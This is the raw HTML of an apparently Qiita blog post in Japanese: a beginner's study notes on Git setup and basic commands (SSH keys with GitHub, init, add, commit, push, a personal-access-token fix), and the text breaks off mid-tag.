srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe26a1d63-7785-4b96-b759-c921b19a935b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=abdc7430c73c2fdb573da787c53da456 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e26a1d63-7785-4b96-b759-c921b19a935b.png\"></a></p>\n<h2 data-sourcepos=\"9:1-9:30\">\n<span id=\"集中管理と分散管理\" class=\"fragment\"></span><a href=\"#%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E3%81%A8%E5%88%86%E6%95%A3%E7%AE%A1%E7%90%86\"><i class=\"fa fa-link\"></i></a>集中管理と分散管理</h2>\n<ul data-sourcepos=\"10:1-14:0\">\n<li data-sourcepos=\"10:1-11:0\">\n<p data-sourcepos=\"10:3-10:175\">集中管理(SVNなど)：ひとつのサーバーで管理するので、なにかしらアクセスできないとみんな最新のファイルやソースがとれない</p>\n</li>\n<li data-sourcepos=\"12:1-14:0\">\n<p data-sourcepos=\"12:3-13:51\">分散管理(Gitなど):各々がサーバーをローカルに持っている（ローカルリポジトリ）、共有するときだけ共有サーバー（リモートリポジトリ）にあげることで、オフラインでも作業ができる<br>\nリモートリポジトリはGithubやGitLabなど</p>\n</li>\n</ul>\n<p data-sourcepos=\"15:1-15:105\">いまいち分散管理のメリットがわからなかったけど、下記の記事で納得した。</p>\n<blockquote data-sourcepos=\"17:1-17:220\">\n<p data-sourcepos=\"17:2-17:220\">分散型システムでは、各ユーザーがリポジトリの完全なコピーを持つことができるため、ネットワークにアクセスせずともローカルで作業を行うことができます。</p>\n</blockquote>\n<p data-sourcepos=\"19:1-19:31\"><iframe id=\"qiita-embed-content__91ce036e752337ed379c0a65071bf869\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__91ce036e752337ed379c0a65071bf869\" data-content=\"https%3A%2F%2Framble.impl.co.jp%2F5948%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"21:1-21:27\">\n<span id=\"git-のワークフロー\" class=\"fragment\"></span><a href=\"#git-%E3%81%AE%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC\"><i class=\"fa fa-link\"></i></a>Git のワークフロー</h1>\n<p data-sourcepos=\"22:1-22:39\">これはclaudeがまとめてくれた</p>\n<ol data-sourcepos=\"23:1-27:0\">\n<li data-sourcepos=\"23:1-23:85\">作業ディレクトリ（Working Directory）: ファイルを編集する場所</li>\n<li data-sourcepos=\"24:1-24:104\">ステージングエリア（Staging Area）: コミット対象のファイルを選択する場所</li>\n<li data-sourcepos=\"25:1-25:102\">ローカルリポジトリ（Local Repository）: コミットした変更が保存される場所</li>\n<li data-sourcepos=\"26:1-27:0\">リモートリポジトリ（Remote Repository）: GitHub などのクラウド上にあるリポジトリ</li>\n</ol>\n<h1 data-sourcepos=\"28:1-28:14\">\n<span id=\"初期設定\" class=\"fragment\"></span><a href=\"#%E5%88%9D%E6%9C%9F%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>初期設定</h1>\n<h2 data-sourcepos=\"29:1-29:72\">\n<span id=\"gitでコミットする際につかう名前とメールアドレス\" class=\"fragment\"></span><a href=\"#git%E3%81%A7%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%99%E3%82%8B%E9%9A%9B%E3%81%AB%E3%81%A4%E3%81%8B%E3%81%86%E5%90%8D%E5%89%8D%E3%81%A8%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9\"><i class=\"fa fa-link\"></i></a>gitでコミットする際につかう名前とメールアドレス</h2>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"30:1-33:3\"><div class=\"highlight\"><pre><code>$ git config --global user.name \"ユーザー名\"\n$ git config --global user.email \"メールアドレス\"\n</code></pre></div></div>\n<h2 data-sourcepos=\"35:1-35:42\">\n<span id=\"sshキーの生成とgithubへの連携\" class=\"fragment\"></span><a href=\"#ssh%E3%82%AD%E3%83%BC%E3%81%AE%E7%94%9F%E6%88%90%E3%81%A8github%E3%81%B8%E3%81%AE%E9%80%A3%E6%90%BA\"><i class=\"fa fa-link\"></i></a>SSHキーの生成とGitHubへの連携</h2>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"36:1-39:3\"><div class=\"highlight\"><pre><code># SSH キーを生成（-t rsa はrsa暗号方式だよ）\nssh-keygen -t rsa\n</code></pre></div></div>\n<p data-sourcepos=\"40:1-40:22\">3回エンター押す</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"41:1-48:3\"><div class=\"highlight\"><pre><code>test@asa:~/jisou/workspace/git-practice$ ssh-keygen -t rsa\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/test/.ssh/id_rsa):\nCreated directory '/home/test/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\n</code></pre></div></div>\n<p data-sourcepos=\"49:1-49:35\"><code>id_rsa</code>と<code>id_rsa.pub</code>ができる</p>\n<ul data-sourcepos=\"50:1-51:47\">\n<li data-sourcepos=\"50:1-50:24\">id_rsa.pub：公開鍵</li>\n<li data-sourcepos=\"51:1-51:47\">id_rsa：秘密鍵　大切にとっておく</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"52:1-56:3\"><div class=\"highlight\"><pre><code>test@asa:~/jisou/workspace/git-practice$ ls ~/.ssh\nid_rsa  id_rsa.pub\ntest@asa:~/jisou/workspace/git-practice$\n</code></pre></div></div>\n<p data-sourcepos=\"58:1-58:45\">できた公開鍵をコピーGitHubに登録</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"59:1-62:3\"><div class=\"highlight\"><pre><code># 公開鍵を表示（コピーしてGitHubに登録する）\ncat ~/.ssh/id_rsa.pub\n</code></pre></div></div>\n<p data-sourcepos=\"63:1-63:63\">GitHubへサインイン、ユーザー画面から設定画面</p>\n<p data-sourcepos=\"65:1-65:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fafc45481-63e6-4843-be31-96676cfdac78.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=518962917d5e22c00b5bec888c804131\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fafc45481-63e6-4843-be31-96676cfdac78.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=518962917d5e22c00b5bec888c804131\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fafc45481-63e6-4843-be31-96676cfdac78.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=87b998a21942909a22fcc4e29d9ef6a5 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/afc45481-63e6-4843-be31-96676cfdac78.png\"></a></p>\n<p data-sourcepos=\"67:1-67:33\">公開鍵を登録後接続確認</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"68:1-71:3\"><div class=\"highlight\"><pre><code># 接続テスト\nssh -T git@github.com\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"73:1-80:3\"><div class=\"highlight\"><pre><code># これがでたらyesを押した\nssh -T git@github.com\nThe authenticity of host 'github.com (20.27.177.113)' can't be established.\nED25519 key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\n</code></pre></div></div>\n<p data-sourcepos=\"82:1-82:123\"><iframe id=\"qiita-embed-content__0724957572d93728145cc5e6c2e2ff7e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0724957572d93728145cc5e6c2e2ff7e\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Fenterprise-cloud%40latest%2Fauthentication%2Fconnecting-to-github-with-ssh%2Ftesting-your-ssh-connection\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"84:1-84:174\">SSHでGitHubに初めて接続するとき、「GitHubサーバーが本物かどうか」を確認するために、そのサーバーの公開鍵をチェックします。</p>\n<p data-sourcepos=\"86:1-88:114\">🔑 公開鍵とは？<br>\n公開鍵はサーバーが持っている鍵で、これが正しいかどうかを確認することで、そのサーバーがなりすましではないと保証できます。<br>\nGitHubは公開鍵を持っていて、それを使って「自分はGitHubですよ」と証明しています。</p>\n<p data-sourcepos=\"90:1-93:57\">GitHubの公開鍵のフィンガープリント（指紋）が表示されているので、公式のものと一致しているか確認します。<br>\n正しいことが確認できたら「yes」と入力することで、その公開鍵がローカルPCに保存されます。<br>\n🗂 保存場所<br>\n公開鍵は以下のファイルに保存されます：</p>\n<p data-sourcepos=\"95:1-96:189\">~/.ssh/known_hosts<br>\nこのファイルには、過去に接続したことがあるサーバーの公開鍵が記録されているため、次回以降は同じ警告が出なくなるというわけです。</p>\n<p data-sourcepos=\"98:1-98:54\"><iframe id=\"qiita-embed-content__85225799db95aa6830ea100d4a05514a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__85225799db95aa6830ea100d4a05514a\" data-content=\"https%3A%2F%2Fqiita.com%2Fikura_ooo%2Fitems%2F12a6f474b1b80122212d\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"100:1-100:23\">\n<span id=\"リポジトリ操作\" class=\"fragment\"></span><a href=\"#%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E6%93%8D%E4%BD%9C\"><i class=\"fa fa-link\"></i></a>リポジトリ操作</h1>\n<h2 data-sourcepos=\"102:1-102:36\">\n<span id=\"ローカルリポジトリ作成\" class=\"fragment\"></span><a href=\"#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>ローカルリポジトリ作成</h2>\n<p data-sourcepos=\"103:1-103:42\">作業したいディレクトリに移動</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"104:1-107:3\"><div class=\"highlight\"><pre><code># 現在のディレクトリに Git リポジトリを作成\n git init\n</code></pre></div></div>\n<p data-sourcepos=\"108:1-108:9\">できた</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"109:1-116:3\"><div class=\"highlight\"><pre><code>test@asa:~/jisou/workspace/git-practice$ ls -la\ntotal 12\ndrwxr-xr-x 3 test test 4096 Mar 14 21:59 .\ndrwxr-xr-x 6 test test 4096 Mar 14 21:26 ..\ndrwxr-xr-x 7 test test 4096 Mar 14 21:59 .git\ntest@asa:~/jisou/workspace/git-practice$\n</code></pre></div></div>\n<p data-sourcepos=\"118:1-118:58\">.gitは隠しファイル　基本的にはみれないよ</p>\n<h2 data-sourcepos=\"120:1-120:36\">\n<span id=\"リモートリポジトリ作成\" class=\"fragment\"></span><a href=\"#%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>リモートリポジトリ作成</h2>\n<p data-sourcepos=\"121:1-123:90\">リモートリポジトリを作る<br>\n<code>git init でつくったリポジトリ（ローカルリポジトリ）</code>と<br>\n<code>git hub上で作ったリポジトリ（リモートリポジトリ）</code>を同期させる</p>\n<p data-sourcepos=\"126:1-126:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9f8dcc43-1008-421e-8357-b85f2876395e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d7b0842a4c0525e8ddc7af689bbe60fb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9f8dcc43-1008-421e-8357-b85f2876395e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d7b0842a4c0525e8ddc7af689bbe60fb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9f8dcc43-1008-421e-8357-b85f2876395e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=19fd79b8b9a23f643889c9f331ea00a2 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9f8dcc43-1008-421e-8357-b85f2876395e.png\"></a></p>\n<p data-sourcepos=\"128:1-128:78\">リモートリポジトリを作った後に以下のコマンドをコピー</p>\n<p data-sourcepos=\"130:1-130:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F109fcb9f-155c-4136-8db1-1136aa64474a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5a1645a01826f2de9a2ecb37ae19d70b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F109fcb9f-155c-4136-8db1-1136aa64474a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5a1645a01826f2de9a2ecb37ae19d70b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F109fcb9f-155c-4136-8db1-1136aa64474a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7622f0d775f40223c2bffbc8f7340b82 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/109fcb9f-155c-4136-8db1-1136aa64474a.png\"></a></p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"132:1-137:3\"><div class=\"highlight\"><pre><code># masterブランチ名をmainに変更\ngit branch -M main\n# リモートリポジトリはこれを使いますよを宣言\ngit remote add origin https://github.com/asa129/git_full_course.git\n</code></pre></div></div>\n<p data-sourcepos=\"139:1-139:76\">masterからmainに変更したことと、同期がとれたことを確認</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"140:1-155:3\"><div class=\"highlight\"><pre><code>test@asa:~/jisou/workspace/git-practice$ git status\nOn branch master\n\nNo commits yet\n\nnothing to commit (create/copy files and use \"git add\" to track)\ntest@asa:~/jisou/workspace/git-practice$ git branch -M main\ngit remote add origin https://github.com/asa129/git_full_course.git\ntest@asa:~/jisou/workspace/git-practice$ git status\nOn branch main\n\nNo commits yet\n\nnothing to commit (create/copy files and use \"git add\" to track)\n</code></pre></div></div>\n<h2 data-sourcepos=\"158:1-158:27\">\n<span id=\"基本的なコマンド\" class=\"fragment\"></span><a href=\"#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89\"><i class=\"fa fa-link\"></i></a>基本的なコマンド</h2>\n<ul data-sourcepos=\"159:1-168:0\">\n<li data-sourcepos=\"159:1-162:0\">\n<p data-sourcepos=\"159:3-161:102\">ローカルリポジトリにコミットする前に<br>\naddコマンドでコミットするファイルを選べるよ、選んだものはステージングエリアというところに追加される<br>\nコミットしたくないものはステージングエリアから外すこともできるよ（）</p>\n</li>\n<li data-sourcepos=\"163:1-165:0\">\n<p data-sourcepos=\"163:3-164:40\">コミットすると、いろんな情報が確認できる　ID じかん　だれがこみっとしたか　変更内容<br>\ngit log　でかくにんできるそう</p>\n</li>\n<li data-sourcepos=\"166:1-168:0\">\n<p data-sourcepos=\"166:3-167:96\">git push クラウド上のリポジトリ（リモートリポジトリ）にローカルリポジトリの変更情報を反映<br>\ngit pull クラウド上のリポジトリの最新情報をローカルリポジトリに反映</p>\n</li>\n</ul>\n<h3 data-sourcepos=\"169:1-169:25\">\n<span id=\"変更情報を確認\" class=\"fragment\"></span><a href=\"#%E5%A4%89%E6%9B%B4%E6%83%85%E5%A0%B1%E3%82%92%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>変更情報を確認</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"170:1-173:3\"><div class=\"highlight\"><pre><code># 変更情報を確認\ngit status\n</code></pre></div></div>\n<p data-sourcepos=\"174:1-174:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fddf9807c-0e9b-4b25-9dd7-7f85a4b6dcd3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=32b4f04a85d37a09278cfc4178892fac\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fddf9807c-0e9b-4b25-9dd7-7f85a4b6dcd3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=32b4f04a85d37a09278cfc4178892fac\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fddf9807c-0e9b-4b25-9dd7-7f85a4b6dcd3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a75567f76fd36f58ec0325ce46a441a9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ddf9807c-0e9b-4b25-9dd7-7f85a4b6dcd3.png\"></a></p>\n<h3 data-sourcepos=\"176:1-176:64\">\n<span id=\"コミットしたいファイルをステージングする\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%97%E3%81%9F%E3%81%84%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%B9%E3%83%86%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>コミットしたいファイルをステージングする</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"177:1-180:3\"><div class=\"highlight\"><pre><code># ファイルをステージングエリアに追加\ngit add ファイル名\n</code></pre></div></div>\n<p data-sourcepos=\"182:1-182:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff8ab9240-2a1e-4f1f-9f5e-f59db6103047.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=369a3d328dd6a53b10636f72b30c48db\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff8ab9240-2a1e-4f1f-9f5e-f59db6103047.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=369a3d328dd6a53b10636f72b30c48db\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff8ab9240-2a1e-4f1f-9f5e-f59db6103047.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7e68ddeba952e4970022b8bc183eacfa 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f8ab9240-2a1e-4f1f-9f5e-f59db6103047.png\"></a></p>\n<h4 data-sourcepos=\"184:1-184:50\">\n<span id=\"複数ファイルをステージングする\" class=\"fragment\"></span><a href=\"#%E8%A4%87%E6%95%B0%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%B9%E3%83%86%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>複数ファイルをステージングする</h4>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"185:1-187:3\"><div class=\"highlight\"><pre><code>git add ファイル1 ファイル2\n</code></pre></div></div>\n<h4 data-sourcepos=\"189:1-189:53\">\n<span id=\"全部のファイルをステージングする\" class=\"fragment\"></span><a href=\"#%E5%85%A8%E9%83%A8%E3%81%AE%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%B9%E3%83%86%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>全部のファイルをステージングする</h4>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"190:1-192:3\"><div class=\"highlight\"><pre><code>git add .\n</code></pre></div></div>\n<h3 data-sourcepos=\"194:1-194:22\">\n<span id=\"コミットする\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>コミットする</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"195:1-198:3\"><div class=\"highlight\"><pre><code># ステージングされたファイルをコミット\ngit commit -m \"コミットメッセージ\"\n</code></pre></div></div>\n<p data-sourcepos=\"199:1-199:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7bb07160-ea32-426b-aab2-a148c37e66b8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=586363e9b60ec210b78033ee62cd92f1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7bb07160-ea32-426b-aab2-a148c37e66b8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=586363e9b60ec210b78033ee62cd92f1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7bb07160-ea32-426b-aab2-a148c37e66b8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=cc845e7e00c7d654969586784f5271cf 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7bb07160-ea32-426b-aab2-a148c37e66b8.png\"></a></p>\n<h3 data-sourcepos=\"201:1-201:22\">\n<span id=\"プッシュする\" class=\"fragment\"></span><a href=\"#%E3%83%97%E3%83%83%E3%82%B7%E3%83%A5%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>プッシュする</h3>\n<p data-sourcepos=\"202:1-202:147\">ローカルリポジトリに反映した（コミットした）変更をリモートリポジトリ（クラウド上のgithub）に反映する</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"204:1-208:3\"><div class=\"highlight\"><pre><code># ローカルの変更をリモートに反映\n# originはリモートって意味 main はmainブランチ\ngit push origin main\n</code></pre></div></div>\n<p data-sourcepos=\"210:1-210:27\">このエラーがでたら</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"211:1-217:3\"><div class=\"highlight\"><pre><code>Username for 'https://github.com': asa129\nPassword for 'https://asa129@github.com':\nremote: Support for password authentication was removed on August 13, 2021.\nremote: Please see https://docs.github.com/get-started/getting-started-with-git/about-remote-repositories#cloning-with-https-urls for information on currently recommended modes of authentication.\nfatal: Authentication failed for 'https://github.com/asa129/git_full_course.git/'\n</code></pre></div></div>\n<p data-sourcepos=\"220:1-220:99\"><iframe id=\"qiita-embed-content__daf80815379dab7df3083572358978dd\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__daf80815379dab7df3083572358978dd\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Fget-started%2Fgit-basics%2Fabout-remote-repositories%23cloning-with-https-urls\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"222:1-222:78\">こちらの記事を参考にパーソナルアクセストークンを作成</p>\n<p data-sourcepos=\"224:1-224:56\"><iframe id=\"qiita-embed-content__3766d01729d086a8fa4964f038e00ab6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3766d01729d086a8fa4964f038e00ab6\" data-content=\"https%3A%2F%2Fqiita.com%2Faramasa_ash%2Fitems%2F3accb139d0296896caa2\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"226:1-226:81\">再度おこない、パスワード入力時にアクセストークンを入力</p>\n<h3 data-sourcepos=\"228:1-228:25\">\n<span id=\"コミットの粒度\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%AE%E7%B2%92%E5%BA%A6\"><i class=\"fa fa-link\"></i></a>コミットの粒度</h3>\n<ul data-sourcepos=\"229:1-233:0\">\n<li data-sourcepos=\"229:1-230:0\">\n<p data-sourcepos=\"229:3-229:32\">なるべく小さくしよう</p>\n</li>\n<li data-sourcepos=\"231:1-231:89\">\n<p data-sourcepos=\"231:3-231:89\">コミット単位ごとにrevartというコマンドで元に戻すことができる</p>\n</li>\n<li data-sourcepos=\"232:1-233:0\">\n<p data-sourcepos=\"232:3-232:149\">一度にたくさんの変更をコミットすると、一部だけもとに戻したくても、他のもの全て変更前になってしまう</p>\n</li>\n</ul>\n<h3 data-sourcepos=\"234:1-234:43\">\n<span id=\"ステージングを取り消したい\" class=\"fragment\"></span><a href=\"#%E3%82%B9%E3%83%86%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%82%92%E5%8F%96%E3%82%8A%E6%B6%88%E3%81%97%E3%81%9F%E3%81%84\"><i class=\"fa fa-link\"></i></a>ステージングを取り消したい</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"235:1-238:3\"><div class=\"highlight\"><pre><code># ステージングを取り消す\ngit restore --staged ファイル名\n</code></pre></div></div>\n<p data-sourcepos=\"240:1-241:122\">ステージング取り消し前<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8d09942f-1076-470c-b3f0-fb04b5ba68b1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3e4c9e3df4571132fd3ba848233026c4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8d09942f-1076-470c-b3f0-fb04b5ba68b1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3e4c9e3df4571132fd3ba848233026c4\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8d09942f-1076-470c-b3f0-fb04b5ba68b1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=faebcd50f8f826db2537f5a3cefb175c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/8d09942f-1076-470c-b3f0-fb04b5ba68b1.png\"></a></p>\n<p data-sourcepos=\"243:1-243:33\">ステージング取り消し後</p>\n<p data-sourcepos=\"245:1-245:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F85c7039b-d149-430b-9c3d-1ed97a97a6ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3404e355f1b251677e1307ab57dac1e7\" target=\"_blank\" rel=\"nofollow noopener\"><img 